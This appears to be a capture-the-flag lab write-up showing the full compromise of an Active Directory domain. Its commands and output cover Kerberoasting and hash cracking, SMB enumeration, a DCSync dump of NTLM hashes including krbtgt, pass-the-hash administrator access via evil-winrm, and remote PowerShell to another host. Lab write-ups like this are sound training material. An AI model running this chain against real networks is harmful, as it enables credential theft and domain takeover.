`10.200.113.102 CORPDC.thereserve.loc corp.thereserve.loc`

# Kerberoasting 
```bash
proxychains impacket-GetUserSPNs -request -dc-ip $IP corp.thereserve.loc/laura.wood:'Password1@'
```

```bash
hashcat -m 13100 -a 0 svcScanning.hash /usr/share/wordlists/rockyou.txt --force
```

`corp.thereserve.loc/svcScanning:Password1!`
-> Go to Server1. It's rdp free account via admin privilege.

# Enum
### SMB

```bash
proxychains crackmapexec smb $IP -u svcScanning -p Password1!
SMB         10.200.113.102  445    CORPDC           [*] Windows 10.0 Build 17763 x64 (name:CORPDC) (domain:corp.thereserve.loc) (signing:True) (SMBv1:False)
SMB         10.200.113.102  445    CORPDC           [+] corp.thereserve.loc\svcScanning:Password1!

proxychains smbmap -H $IP -u svcScanning -p Password1!

[+] IP: 10.200.113.102:445      Name: 10.200.113.102                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
```

### Bloodhound
-> Go to Server1. It's rdp free account via admin privilege.

# DCSync
-> Coming from Server1 since got the svcBackup account.
```bash
proxychains impacket-secretsdump corp.thereserve.loc/svcBackups:'q9nzssaFtGHdqUV3Qv6G'@$IP

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1085  ...  10.200.113.102:445  ...  OK
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1085  ...  10.200.113.102:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1085  ...  10.200.113.102:49667  ...  OK

Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::
THMSetup:1008:aad3b435b51404eeaad3b435b51404ee:0ea3e204f310f846e282b0c7f9ca3af2:::
lisa.moore:1125:aad3b435b51404eeaad3b435b51404ee:e4c1c1ba3b6dbdaf5b08485ce9cbc1cf:::
lisa.jenkins:1126:aad3b435b51404eeaad3b435b51404ee:94ef2aa6af7f6397e4164b40afb86eef:::
```


# Root
```bash
proxychains evil-winrm -i $IP -u Administrator -H 58a478135a93ac3bf058a5ea0e8fdb71

Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1085  ...  10.200.113.102:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
CORPDC
```

`58a478135a93ac3bf058a5ea0e8fdb71	NTLM	Password123`

# Get the left over flag

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> $username = 'Administrator'
*Evil-WinRM* PS C:\Users\Administrator\Documents> $password = ConvertTo-SecureString "Password123" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\Administrator\Documents> $psCred = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)
*Evil-WinRM* PS C:\Users\Administrator\Documents> Enter-PSSession -ComputerName WRK1 -Credential $psCred
You are currently in a Windows PowerShell PSSession and cannot use the Enter-PSSession cmdlet to enter another PSSession.

*Evil-WinRM* PS C:\Users\Administrator\Documents> $session = New-PSSession -ComputerName WRK1.corp.thereserve.loc -Authentication Negotiate -Credential $psCred

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Command -Session $session -ScriptBlock {hostname}

WRK1
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Command -Session $session -ScriptBlock {echo "8020790e-920a-42ca-8205-956041a7b4d5" | Set-Content C:\Users\Administrator\AlvinSmith.txt}
```
# Sum up

So far the entire Corporate Division compromised. 

1. The WebServer can be used to build a userlist, and we have the password policy.
2. The MailServer has an open SMTP port, resulting in a brute force attack to gain access to the user `laura`.`
3. WRK1 allows RDP access as `laura`.
4. The VPNServer can be logged in using the same credentials.
5. The VPNServer panel has a command injection vulnerability and can be exploited to achieve remote code execution and gain root access. Setup pivoting after root.
7. DC suffers Kerberoasting, therefore get another footholder user svcScanning for Server1
8. Server1 Lateral movement with `secretdump` to get another user who has DCSync privilege. 
9. The DC was fully compromised through a DCSync attack by using `svcBackups` user.